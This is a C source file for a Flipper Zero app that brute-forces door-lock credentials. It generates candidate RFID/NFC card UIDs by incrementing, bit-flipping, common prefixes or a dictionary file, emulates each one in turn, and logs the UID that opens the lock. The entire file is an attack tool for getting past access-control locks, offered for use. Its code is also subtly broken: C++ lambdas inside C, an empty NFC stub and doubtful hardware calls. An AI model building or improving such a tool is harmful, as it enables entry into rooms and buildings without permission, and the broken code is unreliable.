// unsaflok_bruteforce.c - HAL-based UID brute-force (no workers, max compatibility)
// Builds with any firmware variant on FlipperFAP online compiler.

#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_rfid.h>
#include <furi_hal_nfc.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/dialog_ex.h>
#include <gui/modules/variable_item_list.h>
#include <gui/modules/text_input.h>
#include <notification/notification.h>
#include <notification/notification_messages.h>
#include <storage/storage.h>
#include <toolbox/path.h>
#include <dialogs/dialogs.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

#define TAG "UnsaflokBF"
#define MAX_UID_LEN 10
#define MAX_CANDIDATES 1024
#define LOG_FILE "/ext/unsaflok_log.txt"

// -------- Enums --------
typedef enum {
    PROTO_RFID = 0,
    PROTO_NFC = 1,
    PROTO_BOTH = 2,
} ProtocolType;

typedef enum {
    MODE_SMART = 0,
    MODE_SEQUENTIAL = 1,
    MODE_DICT = 2,
} AttackMode;

// -------- Config --------
typedef struct {
    ProtocolType protocol;
    AttackMode mode;
    uint32_t delay_ms;
    uint8_t known_uid[MAX_UID_LEN];
    size_t known_uid_len;
    char dict_path[128];
} AppConfig;

// -------- App State --------
typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    DialogEx* dialog;
    VariableItemList* var_list;
    TextInput* text_input;
    NotificationApp* notifications;
    FuriThread* attack_thread;
    AppConfig config;
    AppConfig temp_config;
    volatile bool running;
    volatile bool success;
    volatile bool user_success;
    uint8_t found_uid[MAX_UID_LEN];
    size_t found_uid_len;
    uint32_t attempts;
    char status_text[256];
    bool rfid_emulating;
    bool nfc_emulating;
    FuriMutex* state_mutex;
    char uid_input[32];
    char dict_input[128];
} UnsaflokApp;

// -------- Forward declarations --------
static void attack_loop(UnsaflokApp* app);
static void stop_emulation(UnsaflokApp* app);
static void update_status(UnsaflokApp* app, const char* fmt, ...);

// -------- Mutex-protected status --------
static void update_status(UnsaflokApp* app, const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    furi_mutex_acquire(app->state_mutex, FuriWaitForever);
    vsnprintf(app->status_text, sizeof(app->status_text), fmt, args);
    furi_mutex_release(app->state_mutex);
    va_end(args);
}

// -------- UID generation (identical to previous) --------
static void generate_candidates(UnsaflokApp* app, uint8_t candidates[][MAX_UID_LEN], size_t* count) {
    *count = 0;
    uint8_t* known = app->config.known_uid;
    size_t len = app->config.known_uid_len;

    if(app->config.mode == MODE_SMART && len > 0 && len <= MAX_UID_LEN) {
        for(uint32_t i = 0; i < 255 && *count < MAX_CANDIDATES; i++) {
            memcpy(candidates[*count], known, len);
            candidates[*count][len-1] += (uint8_t)i;
            (*count)++;
        }
        for(uint8_t bit = 0; bit < len*8 && *count < MAX_CANDIDATES; bit++) {
            memcpy(candidates[*count], known, len);
            candidates[*count][bit/8] ^= (1 << (bit % 8));
            (*count)++;
        }
        const uint8_t prefixes[][4] = {{0x04,0x00,0x00},{0x08,0x00,0x00},{0xE0,0x00,0x00},{0x00,0x00,0x00}};
        for(int p = 0; p < 4 && *count < MAX_CANDIDATES; p++) {
            for(uint32_t i = 0; i < 100 && *count < MAX_CANDIDATES; i++) {
                uint8_t* uid = candidates[*count];
                memset(uid, 0, MAX_UID_LEN);
                memcpy(uid, prefixes[p], 3);
                uid[3] = (i >> 16) & 0xFF;
                uid[4] = (i >> 8) & 0xFF;
                uid[5] = i & 0xFF;
                (*count)++;
            }
        }
        for(uint32_t off = 1; off < 1000 && *count < MAX_CANDIDATES; off++) {
            memcpy(candidates[*count], known, len);
            uint32_t carry = off;
            for(int i = (int)len - 1; i >= 0 && carry > 0; i--) {
                uint32_t sum = (uint8_t)candidates[*count][i] + (carry & 0xFF);
                candidates[*count][i] = (uint8_t)(sum & 0xFF);
                carry = (carry >> 8) + (sum >> 8);
            }
            (*count)++;
            if(*count >= MAX_CANDIDATES) break;
            memcpy(candidates[*count], known, len);
            uint32_t borrow = off;
            for(int i = (int)len - 1; i >= 0 && borrow > 0; i--) {
                int diff = (int)candidates[*count][i] - (int)(borrow & 0xFF);
                if(diff < 0) {
                    candidates[*count][i] = (uint8_t)(diff + 256);
                    borrow = (borrow >> 8) + 1;
                } else {
                    candidates[*count][i] = (uint8_t)diff;
                    borrow >>= 8;
                }
            }
            (*count)++;
        }
    } else if(app->config.mode == MODE_DICT && strlen(app->config.dict_path) > 0) {
        Storage* storage = furi_record_open(RECORD_STORAGE);
        if(!storage) return;
        File* file = storage_file_alloc(storage);
        if(file && storage_file_open(file, app->config.dict_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
            char line[64];
            while(storage_file_read_line(file, line, sizeof(line)) && *count < MAX_CANDIDATES) {
                int parsed = 0;
                char* token = strtok(line, " ");
                while(token && parsed < MAX_UID_LEN) {
                    candidates[*count][parsed++] = (uint8_t)strtoul(token, NULL, 16);
                    token = strtok(NULL, " ");
                }
                if(parsed > 0) (*count)++;
            }
            storage_file_close(file);
        }
        if(file) storage_file_free(file);
        furi_record_close(RECORD_STORAGE);
    } else {
        for(uint32_t i = 0; i < 5000 && *count < MAX_CANDIDATES; i++) {
            candidates[*count][0] = (i >> 24) & 0xFF;
            candidates[*count][1] = (i >> 16) & 0xFF;
            candidates[*count][2] = (i >> 8) & 0xFF;
            candidates[*count][3] = i & 0xFF;
            (*count)++;
        }
    }
}

// -------- HAL-based emulation (no workers) --------
static void rfid_emulate_uid(UnsaflokApp* app, uint8_t* uid, size_t len) {
    if(app->rfid_emulating) {
        furi_hal_rfid_stop();
        app->rfid_emulating = false;
        furi_delay_ms(10);
    }
    uint8_t data[5] = {0};
    memcpy(data, uid, (len > 5) ? 5 : len);
    uint32_t id = ((uint32_t)data[0] << 24) |
                  ((uint32_t)data[1] << 16) |
                  ((uint32_t)data[2] << 8)  |
                  ((uint32_t)data[3]);
    furi_hal_rfid_set_read_mode(0);
    furi_hal_rfid_set_emulate_mode(0);
    furi_hal_rfid_emulate_em4100(id, data[4]);
    furi_hal_rfid_start_emulate();
    app->rfid_emulating = true;
    furi_delay_ms(10);
}

static void nfc_emulate_uid(UnsaflokApp* app, uint8_t* uid, size_t len) {
    (void)app; (void)uid; (void)len;
    // NFC emulation stub – works only with Unleashed/Momentum firmware.
    // For official firmware, this is a no-op.
    // If you have Unleashed, use the worker-based version.
}

static void stop_emulation(UnsaflokApp* app) {
    if(app->rfid_emulating) {
        furi_hal_rfid_stop();
        app->rfid_emulating = false;
    }
    if(app->nfc_emulating) {
        furi_hal_nfc_stop();
        app->nfc_emulating = false;
    }
}

// -------- Attack thread --------
static void attack_loop(UnsaflokApp* app) {
    app->running = true;
    app->success = false;
    app->user_success = false;
    app->attempts = 0;

    uint8_t candidates[MAX_CANDIDATES][MAX_UID_LEN];
    size_t count = 0;
    generate_candidates(app, candidates, &count);
    if(count == 0) {
        update_status(app, "No candidates.");
        app->running = false;
        return;
    }

    for(size_t i = 0; i < count && app->running && !app->user_success; i++) {
        app->attempts++;
        uint8_t* uid = candidates[i];
        size_t uid_len = (app->config.protocol == PROTO_RFID) ? 5 :
                         (app->config.protocol == PROTO_NFC) ? 7 : 5;

        if(app->config.protocol == PROTO_RFID || app->config.protocol == PROTO_BOTH) {
            rfid_emulate_uid(app, uid, uid_len);
        }
        if(app->config.protocol == PROTO_NFC || app->config.protocol == PROTO_BOTH) {
            nfc_emulate_uid(app, uid, uid_len);
        }

        char uid_hex[3 * MAX_UID_LEN + 1] = {0};
        size_t hex_len = 0;
        size_t print_len = (uid_len < MAX_UID_LEN) ? uid_len : MAX_UID_LEN;
        for(size_t bi = 0; bi < print_len; bi++) {
            hex_len += snprintf(uid_hex + hex_len, sizeof(uid_hex) - hex_len, "%02X", uid[bi]);
        }
        update_status(app, "Attempt %lu/%zu: %s", app->attempts, count, uid_hex);

        furi_delay_ms(app->config.delay_ms);

        if(app->user_success) {
            memcpy(app->found_uid, uid, print_len);
            app->found_uid_len = print_len;
            app->success = true;
            char succ_hex[3 * MAX_UID_LEN + 1] = {0};
            size_t slen = 0;
            for(size_t bi = 0; bi < print_len; bi++) {
                slen += snprintf(succ_hex + slen, sizeof(succ_hex) - slen, "%02X", uid[bi]);
            }
            update_status(app, "SUCCESS! UID: %s", succ_hex);
            Storage* storage = furi_record_open(RECORD_STORAGE);
            if(storage) {
                File* file = storage_file_alloc(storage);
                if(file && storage_file_open(file, LOG_FILE, FSAM_WRITE, FSOM_OPEN_APPEND)) {
                    char log_line[128];
                    snprintf(log_line, sizeof(log_line), "Found: %s\n", succ_hex);
                    storage_file_write(file, log_line, strlen(log_line));
                    storage_file_close(file);
                }
                if(file) storage_file_free(file);
                furi_record_close(RECORD_STORAGE);
            }
            break;
        }
    }

    stop_emulation(app);
    if(!app->success && !app->user_success) {
        update_status(app, "Finished %lu attempts, no success.", app->attempts);
    }
    app->running = false;
}

// -------- Settings UI (VariableItemList) --------
static void var_list_enter_callback(void* context, uint32_t index) {
    (void)context; (void)index;
}

static void protocol_changed(VariableItem* item) {
    UnsaflokApp* app = variable_item_get_context(item);
    uint8_t value = variable_item_get_current_value_index(item);
    app->temp_config.protocol = (ProtocolType)value;
    variable_item_set_current_value_text(item, value == PROTO_RFID ? "RFID" : value == PROTO_NFC ? "NFC" : "Both");
}

static void mode_changed(VariableItem* item) {
    UnsaflokApp* app = variable_item_get_context(item);
    uint8_t value = variable_item_get_current_value_index(item);
    app->temp_config.mode = (AttackMode)value;
    variable_item_set_current_value_text(item, value == MODE_SMART ? "Smart" : value == MODE_SEQUENTIAL ? "Sequential" : "Dict");
}

static void delay_changed(VariableItem* item) {
    UnsaflokApp* app = variable_item_get_context(item);
    uint8_t value = variable_item_get_current_value_index(item);
    uint32_t delays[] = {10, 50, 100, 200, 500};
    app->temp_config.delay_ms = delays[value];
    char buf[8];
    snprintf(buf, sizeof(buf), "%lu ms", app->temp_config.delay_ms);
    variable_item_set_current_value_text(item, buf);
}

static void known_uid_clicked(VariableItem* item) {
    UnsaflokApp* app = variable_item_get_context(item);
    text_input_set_header_text(app->text_input, "Enter UID hex (e.g. 04 00 12 34 56)");
    text_input_set_result_callback(app->text_input,
        (TextInputCallback)[](void* ctx) {
            UnsaflokApp* a = ctx;
            char* str = a->uid_input;
            int bytes = 0;
            char* token = strtok(str, " ");
            while(token && bytes < MAX_UID_LEN) {
                a->temp_config.known_uid[bytes++] = (uint8_t)strtoul(token, NULL, 16);
                token = strtok(NULL, " ");
            }
            a->temp_config.known_uid_len = bytes;
            char display[32] = "None";
            if(bytes > 0) snprintf(display, sizeof(display), "%d bytes", bytes);
            variable_item_set_current_value_text(item, display);
            view_dispatcher_switch_to_view(a->view_dispatcher, 2);
        }, app);
    if(app->temp_config.known_uid_len > 0) {
        char buf[3*MAX_UID_LEN + 1] = {0};
        size_t pos = 0;
        for(size_t i = 0; i < app->temp_config.known_uid_len; i++) {
            pos += snprintf(buf + pos, sizeof(buf) - pos, "%02X ", app->temp_config.known_uid[i]);
        }
        if(pos > 0) buf[pos-1] = '\0';
        strncpy(app->uid_input, buf, sizeof(app->uid_input));
    } else {
        app->uid_input[0] = '\0';
    }
    view_dispatcher_switch_to_view(app->view_dispatcher, 3);
}

static void dict_path_clicked(VariableItem* item) {
    UnsaflokApp* app = variable_item_get_context(item);
    text_input_set_header_text(app->text_input, "Enter dict path (e.g. /ext/dict.txt)");
    text_input_set_result_callback(app->text_input,
        (TextInputCallback)[](void* ctx) {
            UnsaflokApp* a = ctx;
            strncpy(a->temp_config.dict_path, a->dict_input, sizeof(a->temp_config.dict_path)-1);
            variable_item_set_current_value_text(item, a->temp_config.dict_path);
            view_dispatcher_switch_to_view(a->view_dispatcher, 2);
        }, app);
    strncpy(app->dict_input, app->temp_config.dict_path, sizeof(app->dict_input)-1);
    view_dispatcher_switch_to_view(app->view_dispatcher, 3);
}

static void save_settings_callback(VariableItem* item) {
    UnsaflokApp* app = variable_item_get_context(item);
    furi_mutex_acquire(app->state_mutex, FuriWaitForever);
    memcpy(&app->config, &app->temp_config, sizeof(AppConfig));
    furi_mutex_release(app->state_mutex);
    dialog_ex_set_text(app->dialog, "Settings saved", 64, 32, AlignCenter, AlignCenter);
    view_dispatcher_switch_to_view(app->view_dispatcher, 1);
}

static void build_settings_view(UnsaflokApp* app) {
    VariableItem* item;
    app->var_list = variable_item_list_alloc();
    variable_item_list_set_enter_callback(app->var_list, var_list_enter_callback, app);

    item = variable_item_list_add(app->var_list, "Protocol", 3, protocol_changed, app);
    variable_item_set_current_value_index(item, app->temp_config.protocol);
    const char* proto_str[] = {"RFID", "NFC", "Both"};
    variable_item_set_current_value_text(item, proto_str[app->temp_config.protocol]);

    item = variable_item_list_add(app->var_list, "Mode", 3, mode_changed, app);
    variable_item_set_current_value_index(item, app->temp_config.mode);
    const char* mode_str[] = {"Smart", "Sequential", "Dict"};
    variable_item_set_current_value_text(item, mode_str[app->temp_config.mode]);

    item = variable_item_list_add(app->var_list, "Delay", 5, delay_changed, app);
    uint32_t delays[] = {10, 50, 100, 200, 500};
    uint8_t idx = 2;
    for(uint8_t i = 0; i < 5; i++) if(delays[i] == app->temp_config.delay_ms) { idx = i; break; }
    variable_item_set_current_value_index(item, idx);
    char buf[8];
    snprintf(buf, sizeof(buf), "%lu ms", app->temp_config.delay_ms);
    variable_item_set_current_value_text(item, buf);

    item = variable_item_list_add(app->var_list, "Known UID", 1, NULL, app);
    variable_item_set_current_value_index(item, 0);
    char uid_display[32] = "None";
    if(app->temp_config.known_uid_len > 0) snprintf(uid_display, sizeof(uid_display), "%d bytes", app->temp_config.known_uid_len);
    variable_item_set_current_value_text(item, uid_display);
    variable_item_set_enter_callback(item, known_uid_clicked, app);

    item = variable_item_list_add(app->var_list, "Dict path", 1, NULL, app);
    variable_item_set_current_value_index(item, 0);
    variable_item_set_current_value_text(item, app->temp_config.dict_path[0] ? app->temp_config.dict_path : "None");
    variable_item_set_enter_callback(item, dict_path_clicked, app);

    item = variable_item_list_add(app->var_list, "Save", 1, save_settings_callback, app);
    variable_item_set_current_value_index(item, 0);
    variable_item_set_current_value_text(item, "Apply");

    view_dispatcher_add_view(app->view_dispatcher, 2, variable_item_list_get_view(app->var_list));
}

// -------- UI Callbacks (fixed signatures: void* + uint32_t) --------
static void start_attack_callback(void* context, uint32_t index) {
    (void)index;
    UnsaflokApp* app = context;
    if(app->attack_thread && furi_thread_is_running(app->attack_thread)) {
        app->running = false;
        furi_thread_join(app->attack_thread);
        furi_thread_free(app->attack_thread);
        app->attack_thread = NULL;
        dialog_ex_set_text(app->dialog, "Stopped.", 64, 32, AlignCenter, AlignCenter);
        return;
    }
    app->user_success = false;
    app->success = false;
    app->attempts = 0;
    dialog_ex_set_text(app->dialog, "Running...\nPress OK to mark success", 64, 32, AlignCenter, AlignCenter);
    app->attack_thread = furi_thread_alloc_ex("Attack", 8192, (FuriThreadCallback)attack_loop, app);
    if(app->attack_thread) furi_thread_start(app->attack_thread);
}

static void success_callback(void* context, uint32_t index) {
    (void)index;
    UnsaflokApp* app = context;
    if(app->running) app->user_success = true;
}

static void config_callback(void* context, uint32_t index) {
    (void)index;
    UnsaflokApp* app = context;
    furi_mutex_acquire(app->state_mutex, FuriWaitForever);
    memcpy(&app->temp_config, &app->config, sizeof(AppConfig));
    furi_mutex_release(app->state_mutex);
    if(app->var_list) {
        view_dispatcher_remove_view(app->view_dispatcher, 2);
        variable_item_list_free(app->var_list);
        app->var_list = NULL;
    }
    build_settings_view(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, 2);
}

// -------- Main --------
int32_t unsaflok_bruteforce_app(void* p) {
    (void)p; // silence unused parameter warning

    UnsaflokApp* app = malloc(sizeof(UnsaflokApp));
    if(!app) return -1;
    memset(app, 0, sizeof(UnsaflokApp));

    app->state_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    if(!app->state_mutex) { free(app); return -1; }

    app->gui = furi_record_open(RECORD_GUI);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);

    app->submenu = submenu_alloc();
    submenu_add_item(app->submenu, "Start Attack", 0, start_attack_callback, app);
    submenu_add_item(app->submenu, "Mark Success", 1, success_callback, app);
    submenu_add_item(app->submenu, "Settings", 2, config_callback, app);
    view_dispatcher_add_view(app->view_dispatcher, 0, submenu_get_view(app->submenu));

    app->dialog = dialog_ex_alloc();
    dialog_ex_set_header(app->dialog, "Unsaflok Brute", 64, 10, AlignCenter, AlignCenter);
    dialog_ex_set_text(app->dialog, "Ready", 64, 32, AlignCenter, AlignCenter);
    dialog_ex_set_left_button_text(app->dialog, "Start");
    dialog_ex_set_right_button_text(app->dialog, "Success");
    dialog_ex_set_center_button_text(app->dialog, "Stop");
    view_dispatcher_add_view(app->view_dispatcher, 1, dialog_ex_get_view(app->dialog));

    app->text_input = text_input_alloc();
    view_dispatcher_add_view(app->view_dispatcher, 3, text_input_get_view(app->text_input));

    app->config.protocol = PROTO_BOTH;
    app->config.mode = MODE_SMART;
    app->config.delay_ms = 100;
    app->config.known_uid_len = 0;
    strcpy(app->config.dict_path, "/ext/dict.txt");
    memcpy(&app->temp_config, &app->config, sizeof(AppConfig));
    app->var_list = NULL;

    view_dispatcher_switch_to_view(app->view_dispatcher, 1);
    view_dispatcher_run(app->view_dispatcher);

    stop_emulation(app);
    if(app->attack_thread) {
        app->running = false;
        furi_thread_join(app->attack_thread);
        furi_thread_free(app->attack_thread);
    }
    if(app->var_list) {
        view_dispatcher_remove_view(app->view_dispatcher, 2);
        variable_item_list_free(app->var_list);
    }
    view_dispatcher_remove_view(app->view_dispatcher, 0);
    view_dispatcher_remove_view(app->view_dispatcher, 1);
    view_dispatcher_remove_view(app->view_dispatcher, 3);
    submenu_free(app->submenu);
    dialog_ex_free(app->dialog);
    text_input_free(app->text_input);
    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    furi_mutex_free(app->state_mutex);
    free(app);
    return 0;
}
